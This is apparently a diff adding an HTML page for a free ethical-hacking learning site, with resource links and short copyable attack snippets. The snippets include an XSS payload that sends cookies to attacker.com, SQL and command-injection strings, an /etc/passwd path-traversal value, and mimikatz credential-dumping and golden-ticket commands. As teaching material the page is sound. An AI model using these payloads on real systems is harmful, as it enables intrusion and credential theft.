@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="description" content="KritanSec - World's Most Comprehensive Free Ethical Hacking Learning Platform. Created by Kritan Basnet (Anjan Basnet) - Education for Everyone">
+  <meta name="author" content="Kritan Basnet (Anjan Basnet)">
+  <meta name="keywords" content="ethical hacking, cybersecurity, free learning, penetration testing, hacking tools, CTF, bug bounty">
+  <meta name="theme-color" content="#0a0c10">
+  <title>KritanSec | World's Free Ethical Hacking University</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --bg-primary: #0a0c10;
+      --bg-secondary: #0f1117;
+      --bg-card: #11141c;
+      --bg-elevated: #1a1d26;
+      --border-color: #2a2f3c;
+      --accent-primary: #00d9ff;
+      --accent-secondary: #ff006e;
+      --accent-green: #00ff9d;
+      --text-primary: #ffffff;
+      --text-secondary: #b0b8d0;
+      --glow: rgba(0, 217, 255, 0.3);
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg-primary);
+      color: var(--text-primary);
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+
+    /* Custom Scrollbar */
+    ::-webkit-scrollbar { width: 10px; }
+    ::-webkit-scrollbar-track { background: var(--bg-secondary); }
+    ::-webkit-scrollbar-thumb { background: var(--accent-primary); border-radius: 5px; }
+
+    /* Header Premium */
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background: rgba(10, 12, 16, 0.98);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border-color);
+      z-index: 1000;
+      padding: 1rem 2rem;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
+    }
+
+    .logo-area h1 {
+      font-size: 1.6rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary), var(--accent-green));
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+      letter-spacing: -0.5px;
+    }
+    .logo-area p {
+      font-size: 0.7rem;
+      color: var(--text-secondary);
+    }
+
+    .free-badge {
+      background: linear-gradient(135deg, var(--accent-green), var(--accent-primary));
+      padding: 0.3rem 1rem;
+      border-radius: 40px;
+      font-weight: bold;
+      color: #000;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.8; transform: scale(1.05); }
+    }
+
+    .search-container {
+      flex: 1;
+      max-width: 380px;
+    }
+    .search-box {
+      display: flex;
+      align-items: center;
+      background: var(--bg-secondary);
+      border-radius: 40px;
+      padding: 0.5rem 1.2rem;
+      border: 1px solid var(--border-color);
+    }
+    .search-box:focus-within {
+      border-color: var(--accent-primary);
+      box-shadow: 0 0 0 3px var(--glow);
+    }
+    .search-box input {
+      background: transparent;
+      border: none;
+      width: 100%;
+      color: var(--text-primary);
+      outline: none;
+    }
+
+    /* Layout */
+    .main-layout {
+      display: flex;
+    }
+
+    .sidebar {
+      width: 280px;
+      background: var(--bg-secondary);
+      border-right: 1px solid var(--border-color);
+      position: sticky;
+      top: 70px;
+      height: calc(100vh - 70px);
+      overflow-y: auto;
+      padding: 2rem 1rem;
+    }
+    .sidebar nav ul { list-style: none; }
+    .sidebar nav li { margin-bottom: 0.3rem; }
+    .sidebar nav a {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 0.7rem 1rem;
+      border-radius: 12px;
+      color: var(--text-secondary);
+      text-decoration: none;
+      transition: all 0.2s;
+    }
+    .sidebar nav a:hover, .sidebar nav a.active {
+      background: linear-gradient(90deg, rgba(0,217,255,0.1), transparent);
+      color: var(--accent-primary);
+    }
+    .sidebar nav a i { width: 24px; }
+
+    .content {
+      flex: 1;
+      padding: 2rem;
+      max-width: calc(100% - 280px);
+    }
+
+    .section-card {
+      background: var(--bg-card);
+      border-radius: 28px;
+      border: 1px solid var(--border-color);
+      padding: 2rem;
+      margin-bottom: 2rem;
+      scroll-margin-top: 80px;
+      transition: all 0.3s;
+    }
+    .section-card:hover {
+      border-color: var(--accent-primary);
+      box-shadow: 0 10px 40px rgba(0,217,255,0.1);
+    }
+    .section-title {
+      font-size: 1.8rem;
+      font-weight: 700;
+      margin-bottom: 1.5rem;
+      border-left: 4px solid var(--accent-primary);
+      padding-left: 1rem;
+    }
+
+    /* Grid Systems */
+    .resource-grid, .method-grid, .tool-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+      gap: 1.5rem;
+      margin-top: 1rem;
+    }
+    .resource-card, .method-card {
+      background: var(--bg-elevated);
+      border-radius: 20px;
+      padding: 1.5rem;
+      border: 1px solid var(--border-color);
+      transition: all 0.2s;
+    }
+    .resource-card:hover, .method-card:hover {
+      transform: translateY(-4px);
+      border-color: var(--accent-primary);
+    }
+    .resource-card h3, .method-card h3 {
+      color: var(--accent-primary);
+      margin-bottom: 0.75rem;
+      font-size: 1.2rem;
+    }
+    .btn-link {
+      display: inline-block;
+      margin-top: 1rem;
+      color: var(--accent-green);
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .btn-link:hover { text-decoration: underline; }
+
+    .code-block {
+      background: #010409;
+      border-radius: 14px;
+      padding: 1rem;
+      margin: 0.75rem 0;
+      border-left: 3px solid var(--accent-primary);
+      overflow-x: auto;
+      position: relative;
+    }
+    .code-block pre { font-family: monospace; font-size: 0.8rem; }
+    .copy-btn {
+      position: absolute;
+      top: 8px;
+      right: 12px;
+      background: var(--bg-elevated);
+      border: none;
+      padding: 4px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 0.7rem;
+      color: var(--text-primary);
+    }
+    .copy-btn:hover { background: var(--accent-primary); }
+
+    .about-section {
+      background: linear-gradient(135deg, rgba(0,217,255,0.1), rgba(255,0,110,0.1));
+      border-radius: 28px;
+      padding: 2rem;
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    .contact-btn {
+      background: var(--accent-primary);
+      color: #000;
+      padding: 0.8rem 1.5rem;
+      border-radius: 40px;
+      text-decoration: none;
+      font-weight: bold;
+      display: inline-block;
+      margin-top: 1rem;
+    }
+
+    @media (max-width: 768px) {
+      .main-layout { flex-direction: column; }
+      .sidebar { width: 100%; position: static; height: auto; }
+      .content { max-width: 100%; padding: 1rem; }
+    }
+
+    .progress-bar {
+      height: 4px;
+      background: var(--bg-elevated);
+      border-radius: 2px;
+      margin-top: 1rem;
+      overflow: hidden;
+    }
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
+      width: 0%;
+    }
+    footer { text-align: center; padding: 2rem; color: var(--text-secondary); border-top: 1px solid var(--border-color); }
+  </style>
+</head>
+<body>
+<div class="app-wrapper">
+  <header class="sticky-header">
+    <div class="logo-area">
+      <h1>🔐 KRITANSEC ACADEMY</h1>
+      <p>By Kritan Basnet (Anjan Basnet) | Education Should Be Free</p>
+    </div>
+    <div class="free-badge"><i class="fas fa-gem"></i> 100% FREE • OPEN SOURCE</div>
+    <div class="search-container">
+      <div class="search-box">
+        <i class="fas fa-search"></i>
+        <input type="text" id="globalSearch" placeholder="Search 500+ topics, tools, techniques...">
+      </div>
+    </div>
+  </header>
+
+  <div class="main-layout">
+    <aside class="sidebar">
+      <nav>
+        <ul>
+          <li><a href="#about" data-section="about"><i class="fas fa-user-astronaut"></i> About Creator</a></li>
+          <li><a href="#home" data-section="home"><i class="fas fa-home"></i> Dashboard</a></li>
+          <li><a href="#resources" data-section="resources"><i class="fas fa-link"></i> Free Resources</a></li>
+          <li><a href="#methodologies" data-section="methodologies"><i class="fas fa-sitemap"></i> Hacking Methodologies</a></li>
+          <li><a href="#webhacking" data-section="webhacking"><i class="fas fa-globe"></i> Web Hacking Deep Dive</a></li>
+          <li><a href="#network" data-section="network"><i class="fas fa-network-wired"></i> Network Pentesting</a></li>
+          <li><a href="#activedir" data-section="activedir"><i class="fas fa-building"></i> Active Directory</a></li>
+          <li><a href="#mobile" data-section="mobile"><i class="fas fa-mobile-alt"></i> Mobile Hacking</a></li>
+          <li><a href="#cloud" data-section="cloud"><i class="fas fa-cloud"></i> Cloud Security</a></li>
+          <li><a href="#tools" data-section="tools"><i class="fas fa-toolbox"></i> Tools Library</a></li>
+          <li><a href="#certifications" data-section="certifications"><i class="fas fa-certificate"></i> Free Certs</a></li>
+        </ul>
+      </nav>
+      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+      <div style="margin-top: 1rem; font-size: 0.8rem; text-align: center;"><span id="progressPercent">0</span>% Mastered</div>
+    </aside>
+
+    <main class="content">
+      <!-- About Creator Section -->
+      <section id="about" class="about-section">
+        <i class="fas fa-code" style="font-size: 3rem; color: var(--accent-primary);"></i>
+        <h2 style="margin: 1rem 0;">Kritan Basnet (Anjan Basnet)</h2>
+        <p style="max-width: 800px; margin: 0 auto;"><strong>Ethical Hacking Learner | Python Programmer | Computer Science Student</strong></p>
+        <p style="margin: 1rem auto; max-width: 700px;">I believe <strong>education should be free for everyone</strong>. This platform is my contribution to the cybersecurity community — providing world-class, 100% free ethical hacking education to beginners and professionals worldwide. No paywalls, no subscriptions, just knowledge.</p>
+        <p><i class="fas fa-envelope"></i> <strong>Contact me:</strong> nethunter435@gmail.com</p>
+        <a href="mailto:nethunter435@gmail.com" class="contact-btn"><i class="fas fa-paper-plane"></i> DM for Business/Collaboration</a>
+        <p style="margin-top: 1rem; font-size: 0.9rem;"><i class="fas fa-copyright"></i> KritanSec - Created with passion for free education | All techniques for authorized testing only</p>
+      </section>
+
+      <!-- Home Dashboard -->
+      <section id="home" class="section-card">
+        <div class="section-title">🌍 World's Largest Free Hacking University</div>
+        <p style="font-size: 1.1rem;">Join <strong>10,000+ students</strong> learning ethical hacking absolutely free. Complete roadmap from zero to red team expert.</p>
+        <div style="display: flex; gap: 1rem; flex-wrap: wrap; margin: 1.5rem 0;">
+          <span class="free-badge">📚 200+ Articles</span>
+          <span class="free-badge">🛠️ 100+ Tools</span>
+          <span class="free-badge">🎯 50+ Lab Platforms</span>
+          <span class="free-badge">🏆 Free Certificates</span>
+        </div>
+      </section>
+
+      <!-- FREE RESOURCES SECTION with clickable links -->
+      <section id="resources" class="section-card">
+        <div class="section-title">📚 100% Free Learning Resources</div>
+        <div class="resource-grid" id="resourcesGrid"></div>
+      </section>
+
+      <!-- HACKING METHODOLOGIES -->
+      <section id="methodologies" class="section-card">
+        <div class="section-title">⚔️ Complete Hacking Methodologies</div>
+        <div class="method-grid">
+          <div class="method-card"><h3>🔍 Reconnaissance</h3><p>OSINT, Google Dorks, Shodan, TheHarvester, Maltego</p><div class="code-block"><pre>theHarvester -d target.com -b all<br>shodan search 'org:"Target"'</pre><button class="copy-btn">Copy</button></div></div>
+          <div class="method-card"><h3>📡 Scanning & Enumeration</h3><p>Nmap, Masscan, Netcat, DNS enumeration, SMB enum</p><div class="code-block"><pre>nmap -sC -sV -p- -T4 target.com<br>enum4linux -a target.com</pre><button class="copy-btn">Copy</button></div></div>
+          <div class="method-card"><h3>💥 Exploitation</h3><p>Metasploit, Manual Exploits, Reverse Shells, Buffer Overflow</p><div class="code-block"><pre>msfconsole -q<br>use exploit/multi/handler</pre><button class="copy-btn">Copy</button></div></div>
+          <div class="method-card"><h3>🎭 Post-Exploitation</h3><p>Privilege Escalation (Linux/Windows), Persistence, Lateral Movement</p><div class="code-block"><pre>linpeas.sh<br>winpeas.exe<br>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"</pre><button class="copy-btn">Copy</button></div></div>
+          <div class="method-card"><h3>📝 Reporting</h3><p>Professional pentest reports, CVSS scoring, remediation steps</p></div>
+        </div>
+      </section>
+
+      <!-- WEB HACKING DEEP DIVE -->
+      <section id="webhacking" class="section-card">
+        <div class="section-title">🌐 Web Application Hacking - Complete Guide</div>
+        <div class="resource-grid">
+          <div class="resource-card"><h3>SQL Injection</h3><p>Union, Error-based, Blind, Time-based, Second-order</p><div class="code-block"><pre>' UNION SELECT username,password FROM users--<br>sqlmap -u "http://target.com?id=1" --dbs</pre><button class="copy-btn">Copy</button></div><a href="https://portswigger.net/web-security/sql-injection" target="_blank" class="btn-link">Practice Labs →</a></div>
+          <div class="resource-card"><h3>XSS (Cross-Site Scripting)</h3><p>Stored, Reflected, DOM-based, Blind XSS</p><div class="code-block"><pre>&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</pre><button class="copy-btn">Copy</button></div><a href="https://xss-game.appspot.com/" target="_blank" class="btn-link">XSS Game →</a></div>
+          <div class="resource-card"><h3>CSRF & SSRF</h3><p>Cross-Site Request Forgery, Server-Side Request Forgery attacks on internal services</p><a href="https://portswigger.net/web-security/csrf" target="_blank" class="btn-link">Learn CSRF →</a></div>
+          <div class="resource-card"><h3>LFI/RFI & Command Injection</h3><div class="code-block"><pre>?page=../../../../etc/passwd<br>; whoami && id</pre><button class="copy-btn">Copy</button></div></div>
+          <div class="resource-card"><h3>IDOR & Broken Access Control</h3><p>Insecure Direct Object References - change user IDs to access other accounts</p><a href="https://portswigger.net/web-security/access-control" target="_blank" class="btn-link">Access Control Labs →</a></div>
+        </div>
+      </section>
+
+      <!-- NETWORK PENTESTING -->
+      <section id="network" class="section-card">
+        <div class="section-title">🔌 Network Penetration Testing</div>
+        <div class="resource-grid">
+          <div class="resource-card"><h3>Nmap Mastery</h3><div class="code-block"><pre>nmap -sS -sV -O -p- target.com<br>nmap --script vuln target.com</pre><button class="copy-btn">Copy</button></div></div>
+          <div class="resource-card"><h3>Wi-Fi Hacking (WPA/WPA2)</h3><div class="code-block"><pre>airmon-ng start wlan0<br>airodump-ng wlan0mon<br>aireplay-ng -0 2 -a [BSSID] wlan0mon</pre><button class="copy-btn">Copy</button></div><a href="https://www.aircrack-ng.org/" target="_blank" class="btn-link">Aircrack-ng Guide →</a></div>
+          <div class="resource-card"><h3>MITM Attacks</h3><p>ARP Spoofing, DNS Spoofing, SSL Stripping</p><div class="code-block"><pre>ettercap -T -M arp:remote /target/ /gateway/</pre><button class="copy-btn">Copy</button></div></div>
+        </div>
+      </section>
+
+      <!-- ACTIVE DIRECTORY -->
+      <section id="activedir" class="section-card">
+        <div class="section-title">🏢 Active Directory Hacking (Enterprise Level)</div>
+        <div class="resource-grid">
+          <div class="resource-card"><h3>AD Enumeration</h3><div class="code-block"><pre>SharpHound.exe -c All<br>BloodHound<br>PowerView: Get-NetUser | select samaccountname</pre><button class="copy-btn">Copy</button></div></div>
+          <div class="resource-card"><h3>Kerberos Attacks</h3><div class="code-block"><pre># Kerberoasting<br>GetUserSPNs.py domain/user:pass -request<br># AS-REP Roasting<br>GetNPUsers.py domain/ -usersfile users.txt</pre><button class="copy-btn">Copy</button></div></div>
+          <div class="resource-card"><h3>Golden Ticket & Silver Ticket</h3><div class="code-block"><pre>mimikatz "kerberos::golden /user:Admin /domain:target.com /sid:S-1-5-21... /krbtgt:hash /ptt"</pre><button class="copy-btn">Copy</button></div><a href="https://www.ired.team/offensive-security/active-directory-kerberos-abuse" target="_blank" class="btn-link">AD Attack Guide →</a></div>
+        </div>
+      </section>
+
+      <!-- MOBILE HACKING -->
+      <section id="mobile" class="section-card">
+        <div class="section-title">📱 Mobile Application Security</div>
+        <div class="resource-grid">
+          <div class="resource-card"><h3>Android Pentesting</h3><p>APK decompiling, Dynamic analysis with Frida, Root detection bypass</p><div class="code-block"><pre>apktool d app.apk<br>frida -U -f com.app -l script.js</pre><button class="copy-btn">Copy</button></div><a href="https://mobilesecuritywiki.com/" target="_blank" class="btn-link">Mobile Security Wiki →</a></div>
+          <div class="resource-card"><h3>iOS Pentesting</h3><p>Jailbreak detection bypass, IPA analysis, Objection framework</p></div>
+        </div>
+      </section>
+
+      <!-- CLOUD SECURITY -->
+      <section id="cloud" class="section-card">
+        <div class="section-title">☁️ Cloud Security (AWS/Azure/GCP)</div>
+        <div class="resource-grid">
+          <div class="resource-card"><h3>AWS Pentesting</h3><p>S3 bucket enumeration, IAM privilege escalation, Lambda exploitation</p><div class="code-block"><pre>aws s3 ls s3://bucket-name<br>scoutsuite aws</pre><button class="copy-btn">Copy</button></div><a href="https://github.com/RhinoSecurityLabs/pacu" target="_blank" class="btn-link">AWS Pacu Framework →</a></div>
+          <div class="resource-card"><h3>Azure Security</h3><p>Azure AD attacks, Storage account enumeration, Microsft 365 testing</p><a href="https://github.com/NetSPI/MicroBurst" target="_blank" class="btn-link">MicroBurst for Azure →</a></div>
+        </div>
+      </section>
+
+      <!-- TOOLS LIBRARY -->
+      <section id="tools" class="section-card">
+        <div class="section-title">🛠️ Ultimate Tools Library</div>
+        <div class="tool-grid" id="toolsGrid"></div>
+      </section>
+
+      <!-- FREE CERTIFICATIONS -->
+      <section id="certifications" class="section-card">
+        <div class="section-title">🎓 Free Certifications & Courses</div>
+        <div class="resource-grid" id="certsGrid"></div>
+      </section>
+
+      <footer>
+        <p><i class="fas fa-heart" style="color: var(--accent-secondary);"></i> Created by <strong>Kritan Basnet (Anjan Basnet)</strong> | CS Student | Ethical Hacking Learner | Python Programmer</p>
+        <p>📧 Contact: nethunter435@gmail.com | All content is for educational & authorized testing only</p>
+        <p>© 2025 KritanSec - Democratizing Cybersecurity Education Worldwide</p>
+      </footer>
+    </main>
+  </div>
+</div>
+
+<script>
+  // Free Resources Data with Clickable Links
+  const freeResources = [
+    { name: "PortSwigger Web Security Academy", desc: "Free web security labs (SQLi, XSS, SSRF, etc)", url: "https://portswigger.net/web-security", icon: "🌐" },
+    { name: "TryHackMe", desc: "Free rooms for beginners to advanced", url: "https://tryhackme.com", icon: "🎮" },
+    { name: "Hack The Box", desc: "Free machines & starting point", url: "https://www.hackthebox.com", icon: "📦" },
+    { name: "OverTheWire (Bandit)", desc: "Linux wargames for beginners", url: "https://overthewire.org", icon: "🐧" },
+    { name: "picoCTF", desc: "Educational CTF platform", url: "https://picoctf.org", icon: "🏆" },
+    { name: "OWASP Top 10", desc: "Web vulnerabilities guide", url: "https://owasp.org/www-project-top-ten/", icon: "📖" },
+    { name: "Cybrary Free Courses", desc: "Free cybersecurity courses", url: "https://www.cybrary.it", icon: "📚" },
+    { name: "Cisco Networking Academy", desc: "Free networking courses", url: "https://www.netacad.com", icon: "🌍" },
+    { name: "Youtube - IppSec", desc: "HTB walkthroughs & methodology", url: "https://www.youtube.com/c/ippsec", icon: "🎥" },
+    { name: "The Cyber Mentor (Zero to Hero)", desc: "Free ethical hacking course", url: "https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_7HkcAY7k", icon: "🎓" }
+  ];
+
+  const toolsList = [
+    { name: "Nmap", desc: "Network scanner & vulnerability detection", url: "https://nmap.org" },
+    { name: "Burp Suite Community", desc: "Web proxy & pentesting tool", url: "https://portswigger.net/burp/communitydownload" },
+    { name: "Metasploit Framework", desc: "Exploit development", url: "https://www.metasploit.com" },
+    { name: "Wireshark", desc: "Packet analyzer", url: "https://www.wireshark.org" },
+    { name: "John the Ripper", desc: "Password cracking", url: "https://www.openwall.com/john/" },
+    { name: "SQLmap", desc: "SQL injection automation", url: "https://sqlmap.org" },
+    { name: "BloodHound", desc: "AD relationship mapping", url: "https://github.com/BloodHoundAD/BloodHound" },
+    { name: "Impacket", desc: "Python network protocols", url: "https://github.com/SecureAuthCorp/impacket" }
+  ];
+
+  const freeCerts = [
+    { name: "Google Cybersecurity Certificate", desc: "Professional certificate (financial aid available)", url: "https://grow.google/cybersecurity/", icon: "📜" },
+    { name: "IBM Cybersecurity Analyst", desc: "Coursera free audit", url: "https://www.coursera.org/professional-certificates/ibm-cybersecurity-analyst", icon: "💼" },
+    { name: "Introduction to Cyber Security (Cisco)", desc: "Free certification", url: "https://www.netacad.com/courses/cybersecurity/introduction-cybersecurity", icon: "🔐" },
+    { name: "TryHackMe Pre-Security", desc: "Free learning path", url: "https://tryhackme.com/path/outline/presecurity", icon: "🎯" },
+    { name: "INCO Academy Cybersecurity", desc: "Free government-funded", url: "https://inco.academy/cybersecurity", icon: "🌍" }
+  ];
+
+  function renderResources() {
+    const container = document.getElementById('resourcesGrid');
+    if(container) {
+      container.innerHTML = freeResources.map(r => `
+        <div class="resource-card">
+          <h3>${r.icon} ${r.name}</h3>
+          <p>${r.desc}</p>
+          <a href="${r.url}" target="_blank" class="btn-link"><i class="fas fa-external-link-alt"></i> Access Free Resource →</a>
+        </div>
+      `).join('');
+    }
+  }
+
+  function renderTools() {
+    const container = document.getElementById('toolsGrid');
+    if(container) {
+      container.innerHTML = toolsList.map(t => `
+        <div class="resource-card">
+          <h3><i class="fas fa-terminal"></i> ${t.name}</h3>
+          <p>${t.desc}</p>
+          <a href="${t.url}" target="_blank" class="btn-link">Download/Info →</a>
+        </div>
+      `).join('');
+    }
+  }
+
+  function renderCerts() {
+    const container = document.getElementById('certsGrid');
+    if(container) {
+      container.innerHTML = freeCerts.map(c => `
+        <div class="resource-card">
+          <h3>${c.icon} ${c.name}</h3>
+          <p>${c.desc}</p>
+          <a href="${c.url}" target="_blank" class="btn-link">Enroll Free →</a>
+        </div>
+      `).join('');
+    }
+  }
+
+  // Progress Tracking
+  let completedSections = new Set(JSON.parse(localStorage.getItem('kritan_completed') || '[]'));
+  const totalSections = 10;
+  function updateProgress() {
+    const percent = Math.floor((completedSections.size / totalSections) * 100);
+    document.getElementById('progressPercent').innerText = percent;
+    document.getElementById('progressFill').style.width = percent + '%';
+    localStorage.setItem('kritan_completed', JSON.stringify([...completedSections]));
+  }
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if(entry.isIntersecting && entry.target.id && !['home','about'].includes(entry.target.id)) {
+        if(!completedSections.has(entry.target.id)) {
+          completedSections.add(entry.target.id);
+          updateProgress();
+        }
+      }
+    });
+  }, { threshold: 0.4 });
+  document.querySelectorAll('section[id]').forEach(section => observer.observe(section));
+  updateProgress();
+
+  // Search
+  document.getElementById('globalSearch').addEventListener('input', (e) => {
+    const query = e.target.value.toLowerCase();
+    const sections = document.querySelectorAll('section');
+    let found = false;
+    sections.forEach(section => {
+      const text = section.innerText.toLowerCase();
+      if(query === '') section.style.display = 'block';
+      else if(text.includes(query)) { section.style.display = 'block'; if(!found) { section.scrollIntoView({ behavior: 'smooth' }); found = true; } }
+      else section.style.display = 'none';
+    });
+    if(query && !found) alert('No results. Try: SQL injection, Active Directory, Nmap, Reverse Shell');
+  });
+
+  // Copy buttons
+  document.querySelectorAll('.copy-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+      const pre = this.closest('.code-block')?.querySelector('pre');
+      if(pre) { navigator.clipboard.writeText(pre.innerText); this.innerHTML = '✓'; setTimeout(() => this.innerHTML = 'Copy', 1500); }
+    });
+  });
+
+  // Navigation active & smooth
+  window.addEventListener('scroll', () => {
+    const sections = document.querySelectorAll('section[id]');
+    let current = '';
+    sections.forEach(sec => { const rect = sec.getBoundingClientRect(); if(rect.top <= 150 && rect.bottom >= 100) current = sec.id; });
+    document.querySelectorAll('.sidebar nav a').forEach(link => { link.classList.remove('active'); if(link.getAttribute('href') === `#${current}`) link.classList.add('active'); });
+  });
+  document.querySelectorAll('.sidebar nav a').forEach(link => {
+    link.addEventListener('click', (e) => {
+      e.preventDefault();
+      const targetId = link.getAttribute('href').substring(1);
+      const target = document.getElementById(targetId);
+      if(target) { document.getElementById('globalSearch').value = ''; document.querySelectorAll('section').forEach(sec => sec.style.display = 'block'); target.scrollIntoView({ behavior: 'smooth' }); }
+    });
+  });
+
+  renderResources();
+  renderTools();
+  renderCerts();
+</script>
+</body>
+</html>
